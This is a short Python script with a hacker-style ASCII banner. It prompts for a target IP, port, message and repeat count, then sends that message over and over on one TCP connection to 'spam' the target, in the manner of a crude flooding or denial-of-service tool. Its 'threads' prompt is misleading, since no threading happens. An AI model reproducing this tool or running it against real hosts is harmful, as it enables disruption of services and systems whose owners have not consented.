import socket
import sys

sys.ps1 = '\033[01;32m '

print(sys.ps1)
print('''

 ####### ######   #####   #####  
    #    #     # #     # #     # 
    #    #     #       #       # 
    #    ######   #####   #####  
    #    #   #         #       # 
    #    #    #  #     # #     # 
    #    #     #  #####   #####  
                                 

''')

IP1 = input("Enter IP: ")
port1 = int(input("Enter the port: "))
T1 = input("How many Threads ya wanna send?: ")

s = int(input("Enter the packet size: "))

TCP_IP = IP1
TCP_PORT = port1
BUFFER_SIZE = s
MESSAGE = input("Enter the message ya wanna spam: ")

print("connecting...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print("spamming "+TCP_IP)

for i in range(int(T1)):
    s.send(bytes(MESSAGE, 'UTF-8'))
    data = s.recv(BUFFER_SIZE)
    print('spamming '+TCP_IP)
s.close()
print("spam completed now go to back to bed")
